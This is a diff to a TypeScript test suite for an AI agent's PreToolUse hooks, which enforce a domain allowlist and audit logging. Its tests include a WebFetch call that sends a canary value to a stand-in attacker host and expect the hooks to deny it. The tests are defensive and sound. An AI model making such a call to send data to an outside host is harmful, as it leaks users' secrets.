@@ -32,7 +32,7 @@ const decision = (outs: unknown[]) =>
 /** The golden calls: a listed WebFetch, an unlisted one carrying the canary, and a Bash call big enough to be cut. */
 async function goldenEntries(): Promise<AuditEntry[]> {
   const sent: AuditEntry[] = []
-  const hooks = preToolUseHooks(['docs.example.com'], [], { audit: async (e: AuditEntry) => void sent.push(e) }, 1_000)
+  const hooks = preToolUseHooks(['docs.example.com'], [], { loneToolCall: async () => false, audit: async (e: AuditEntry) => void sent.push(e) }, 1_000)
   expect(decision(await runHooks(hooks, call('toolu_listed', 'WebFetch', { url: 'https://docs.example.com/guide', prompt: 'Summarise it.' }) as never))).toBe('allow')
   expect(decision(await runHooks(hooks, call('toolu_unlisted', 'WebFetch', { url: `https://collect.evil-example.test/ping?d=${CANARY}`, prompt: 'Summarise it.' }) as never))).toBe('deny')
   expect(decision(await runHooks(hooks, call('toolu_bash', 'Bash', { command: `echo ${'y'.repeat(20_000)}` }) as never))).toBe('allow')
@@ -53,7 +53,7 @@ describe('the PreToolUse hooks together', () => {
     expect(await goldenEntries()).toEqual(JSON.parse(readFileSync(GOLDEN, 'utf8')))
   })
   it('a deny entry that can\'t be recorded blocks the call (failure 3)', async () => {
-    const hooks = preToolUseHooks(['docs.example.com'], [], { audit: () => Promise.reject(new Error('the Worker has gone')) }, 1_000)
+    const hooks = preToolUseHooks(['docs.example.com'], [], { loneToolCall: async () => false, audit: () => Promise.reject(new Error('the Worker has gone')) }, 1_000)
     await expect(runHooks(hooks, call('toolu_x', 'WebFetch', { url: 'https://collect.evil-example.test/' }) as never)).rejects.toThrow(/audit not recorded/)
   })
 })
